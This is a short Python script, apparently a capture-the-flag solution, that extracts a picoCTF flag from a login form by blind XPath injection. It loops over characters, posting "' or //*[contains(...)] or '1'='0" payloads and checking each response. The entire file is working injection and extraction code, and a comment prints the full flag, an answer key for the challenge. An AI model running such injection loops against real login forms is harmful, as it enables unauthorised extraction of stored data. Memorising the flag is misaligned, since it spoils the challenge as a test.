import requests
import re
import string

url = 'http://mercury.picoctf.net:20297/'

character = string.ascii_lowercase + string.digits + '}'
# real flag = picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_a313a6a7}
fl = 'picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_a313a'

# payload = {'name': "' or //*[contains(., '"+flag+"')] or '1'='0", 'pass': 'admin'}

# req = requests.post(url, payload)

ag = ''

while True:
	for c in character:
		payload = {'name': "' or //*[contains(., '"+fl+ag+c+"')] or '1'='0", 'pass': 'admin'}

		req = requests.post(url, payload)

		if re.search('right', req.text):
			ag += c
			print(fl+ag)
			continue
		else:
			print(fl+ag)
			pass
